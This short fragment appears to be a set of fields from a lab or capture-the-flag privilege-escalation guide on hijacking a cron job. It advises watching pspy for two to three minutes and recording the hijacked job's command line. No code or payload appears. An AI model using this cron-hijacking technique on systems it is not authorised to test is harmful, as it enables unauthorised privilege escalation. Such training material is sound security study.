fields.next: modify the target of the job.
fields.mistake: running pspy for 30 seconds. Cron fires on the minute — watch for at least 2-3 minutes.
fields.evidence: the command line of the job you hijacked.
